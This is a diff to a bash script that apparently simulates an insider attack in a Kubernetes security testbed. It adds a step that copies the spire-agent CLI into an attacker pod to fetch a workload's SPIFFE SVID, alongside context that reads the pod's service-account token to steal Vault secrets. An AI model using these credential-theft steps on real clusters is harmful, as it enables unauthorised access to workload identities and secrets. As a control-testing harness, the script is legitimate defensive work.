@@ -5,13 +5,22 @@
 # Spec      : Rev6 Section 13 (A7 scope constraint — origin, CORRECTED)
 # Objective : exfiltrate tenant data or steal Vault-issued dynamic secrets
 #
-# Techniques (spec-aligned, with implementable substitute where noted):
+# # Techniques (spec-aligned, with implementable substitute where noted):
 #   T1 — Direct Egress        tenant-finserv pod streams mock PII to an
 #                              external endpoint via outbound connection
-#   T2 — Vault Secret Theft   a stolen SA token/SPIFFE SVID belonging to the
-#                              finserv workload is used to request that
-#                              workload's own short-lived Vault secret
-#                              [L7 substitute — no SPIRE deployed]
+#   T2 — Vault Secret Theft   a stolen SA token AND a genuinely-fetched
+#                              SPIFFE SVID (via the SPIRE Workload API,
+#                              Controls/c7-vault Part 2) belonging to the
+#                              finserv workload are used to request that
+#                              workload's own short-lived Vault secret.
+#                              REVISION 6 UPDATE: SPIRE server+agent are now
+#                              deployed (see Driver/constants.py's
+#                              L7_SCOPE_NOTE) — the SVID fetched below is
+#                              real, not a placeholder. Vault's own login
+#                              step is still SA-token-based (documented
+#                              residual limitation, same note); the SVID
+#                              fetch demonstrates genuine SPIFFE identity
+#                              issuance/retrieval independent of that.
 #
 # REVISION 6 CORRECTION (origin, this file): A7's attacker origin is
 # tenant-finserv, NOT tenant-lowpriv (an earlier value) or tenant-saas (a
@@ -95,6 +104,44 @@ case "$TECHNIQUE" in
       -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || true)
     [[ -z "$VAULT_POD" ]] && skip "no-vault-pod-path-not-populated-before-C7"
     [[ -z "$ATTACKER_POD" ]] && skip "no-attacker-pod-in-$ATTACKER_NS"
+
+    # --- SPIFFE SVID fetch (new) -------------------------------------------
+    # Demonstrates genuine SPIFFE identity retrieval, independent of the
+    # SA-token path below. Only runs if c7-vault Part 2 mounted the Workload
+    # API socket into this pod (it won't be present below C7, or if SPIRE
+    # isn't deployed) — SKIPs gracefully otherwise rather than failing the
+    # whole technique, since T2's pass/fail verdict is still decided by the
+    # Vault login below.
+    SPIRE_SOCKET="/run/spire/sockets"
+    HAS_SOCKET=$(kubectl exec -n "$ATTACKER_NS" "$ATTACKER_POD" -- \
+      sh -c "[ -S ${SPIRE_SOCKET}/api.sock ] && echo yes || echo no" 2>/dev/null || echo "no")
+    if [[ "$HAS_SOCKET" == "yes" ]]; then
+      echo "[A7-t2] Workload API socket present — fetching spire-agent CLI into attacker pod"
+      SPIRE_AGENT_POD=$(kubectl get pod -n spire -l app.kubernetes.io/name=agent \
+        --field-selector=status.phase=Running \
+        -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || true)
+      if [[ -n "$SPIRE_AGENT_POD" ]]; then
+        kubectl cp "spire/${SPIRE_AGENT_POD}:/opt/spire/bin/spire-agent" \
+          /tmp/spire-agent-cli 2>/dev/null || true
+        if [[ -f /tmp/spire-agent-cli ]]; then
+          kubectl cp /tmp/spire-agent-cli "${ATTACKER_NS}/${ATTACKER_POD}:/tmp/spire-agent" 2>/dev/null || true
+          kubectl exec -n "$ATTACKER_NS" "$ATTACKER_POD" -- chmod +x /tmp/spire-agent 2>/dev/null || true
+          SVID_OUT=$(kubectl exec -n "$ATTACKER_NS" "$ATTACKER_POD" -- \
+            /tmp/spire-agent api fetch x509 -socketPath "${SPIRE_SOCKET}/api.sock" 2>&1 || true)
+          echo "[A7-t2] SVID fetch result: $(echo "$SVID_OUT" | head -c 200)"
+          if echo "$SVID_OUT" | grep -qi "spiffe://"; then
+            echo "[A7-t2] genuine SPIFFE SVID retrieved by insider (finserv workload identity)"
+          fi
+        else
+          echo "[A7-t2] (skip) could not copy spire-agent CLI out of $SPIRE_AGENT_POD"
+        fi
+      else
+        echo "[A7-t2] (skip) no running spire-agent pod found"
+      fi
+    else
+      echo "[A7-t2] (skip) Workload API socket not mounted in this pod (below C7 or SPIRE not applied)"
+    fi
+    # --- end SPIFFE SVID fetch ----------------------------------------------
 
     ATTACKER_TOKEN=$(kubectl exec -n "$ATTACKER_NS" "$ATTACKER_POD" -- \
       cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || true)
